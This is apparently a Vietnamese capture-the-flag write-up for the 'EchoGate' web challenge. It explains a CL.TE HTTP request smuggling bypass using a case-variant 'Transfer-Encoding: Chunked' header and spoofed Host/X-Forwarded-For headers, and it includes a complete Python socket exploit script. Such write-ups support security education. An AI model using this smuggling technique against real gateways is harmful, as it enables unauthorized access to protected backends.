---
title: "EchoGate"
category: "Web"
tags: ["web", "http-request-smuggling", "cl-te", "transfer-encoding", "gateway-bypass", "xff"]
solve_date: "2026-11-02T13:29:13+07:00"
language: "vi"
points: 132
---

# EchoGate — lỗi phân biệt hoa thường ở `Transfer-Encoding: Chunked` dẫn tới CL.TE smuggling

**Flag:** `CTF{12de61a5e5def6eb9d565836bd461566}`  
**Service:** `http://169.58.126.107:3005`  
**Định dạng flag:** `CTF{...}`

## Đề bài

> EchoGate — 132 điểm. EchoGate là một internal API gateway nhỏ: proxy public đứng trước backend service mà người dùng không được phép truy cập trực tiếp. Gateway chỉ cho qua một số route public hẹp; mọi thứ khác nằm ngoài phạm vi của nó.

Gateway chỉ mở một tập route public theo allowlist. Backend phía sau có route `/admin/flag`, vốn chỉ nên truy cập được từ origin nội bộ.

## Phân tích

### Routing của gateway

Front proxy chỉ cho qua request có raw request-target bắt đầu bằng `/api/`. Router backend thì so khớp chính xác raw target, nên route public duy nhất dùng được là:

```text
POST /api/echo
```

Route này echo lại request body. Thêm query string trên cùng path thì router coi đó là target khác và trả `404`. Gateway rate-limit theo burst khoảng 20 request, sau đó bổ sung khoảng một request mỗi ba giây.

### Lỗi framing

Gateway từ chối đúng các request có cả `Transfer-Encoding` và `Content-Length`, trả về:

```text
400 ambiguous framing
```

Phép kiểm tra so sánh value có phân biệt hoa thường: nó chỉ tìm đúng chuỗi `chunked`. Gửi:

```http
Transfer-Encoding: Chunked
```

sẽ qua được bước kiểm tra của gateway, trong khi HTTP parser ở backend xử lý value không phân biệt hoa thường và chuyển sang chunked framing. Đây là CL.TE desync:

- Front proxy đọc body theo `Content-Length`.
- Backend đọc body theo chunked framing và dừng ở terminator `0\r\n\r\n`.
- Mọi byte sau terminator được backend parse thành HTTP request thứ hai, qua mặt allowlist của gateway.

### Truy cập route admin

Smuggle trực tiếp `GET /admin/flag` sẽ tới backend nhưng trả:

```text
403 admin access requires internal origin
```

Origin check tin vào `Host` và `X-Forwarded-For`. Thêm cả hai header vào request smuggled sẽ thỏa điều kiện:

```http
GET /admin/flag HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
```

Backend sau đó trả `200 OK` kèm flag.

## Khai thác

```python
import socket

HOST, PORT = "169.58.126.107", 3005

smuggled = (
    b"GET /admin/flag HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"X-Forwarded-For: 127.0.0.1\r\n"
    b"\r\n"
)

body = b"0\r\n\r\n" + smuggled

request = (
    b"POST /api/echo HTTP/1.1\r\n"
    b"Host: 169.58.126.107:3005\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Transfer-Encoding: Chunked\r\n"
    + b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    + body
)

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(request)

out = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    out += chunk
print(out.decode(errors="replace"))
```

Response thứ hai trên kết nối là câu trả lời của backend cho request đã smuggle:

```text
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 38

CTF{12de61a5e5def6eb9d565836bd461566}
```

## Ghi chú

- Kiểm tra ambiguity của gateway là so sánh chuỗi, không phải parse HTTP: `chunked` chữ thường bị chặn, còn `Chunked` được chấp nhận rồi backend chuẩn hóa.
- Allowlist được kiểm tra trên raw request-target ở front proxy. Request thứ hai do backend parse từ body smuggled không đi qua bước kiểm tra đó.
- Origin check của route admin dựa trên header (`Host` và `X-Forwarded-For`). Request smuggled do client tự tạo nên có thể đặt cả hai giá trị.
- Rate limit tính theo IP và cho phép burst; khi payload đã đúng thì chỉ cần một request, nên giới hạn chủ yếu ảnh hưởng lúc dò route.

## Tham khảo

- HTTP request smuggling, CL.TE desync
- CWE-444 — Inconsistent Interpretation of HTTP Requests
